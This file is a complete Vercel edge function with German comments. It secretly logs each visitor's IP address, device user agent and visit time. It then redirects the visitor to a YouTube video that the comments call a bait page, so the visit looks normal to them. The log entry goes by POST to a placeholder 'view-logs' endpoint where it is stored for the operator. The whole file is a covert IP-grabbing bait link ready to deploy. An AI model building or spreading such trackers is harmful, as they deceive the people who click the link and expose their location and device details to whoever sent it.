// api/log.js
import { ipAddress } from '@vercel/edge';

export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  const ip = ipAddress(request) || 'unknown';
  const userAgent = request.headers.get('user-agent') || 'unknown';
  const timestamp = new Date().toISOString();

  // Erstelle den Log-Eintrag
  const logEntry = `IP: ${ip} | Zeit: ${timestamp} | Gerät: ${userAgent}\n`;

  // Leite den Nutzer auf die Köder-Seite weiter.
  // Wir erstellen eine einfache HTML-Seite als Antwort, die den Nutzer weiterleitet.
  // So sieht es für ihn aus, als hätte er eine normale Seite aufgerufen.
  const redirectUrl = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';

  const htmlResponse = `
    <!DOCTYPE html>
    <html>
      <head>
        <meta http-equiv="refresh" content="0; url=${redirectUrl}">
        <title>Weiterleitung...</title>
      </head>
      <body>
        <p>Wird weitergeleitet...</p>
      </body>
    </html>
  `;

  // Sende den Log-Eintrag an die view-logs Funktion, um ihn zu speichern.
  // Dies ist ein Trick, um Zustand (die Log-Datei) in Edge Functions zu speichern.
  try {
    await fetch('https://deine-url.vercel.app/api/view-logs', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: logEntry,
    });
  } catch (error) {
    // Falls das Speichern fehlschlägt, machen wir trotzdem weiter.
    console.error("Failed to log IP:", error);
  }

  return new Response(htmlResponse, {
    status: 200,
    headers: { 'Content-Type': 'text/html' },
  });
}
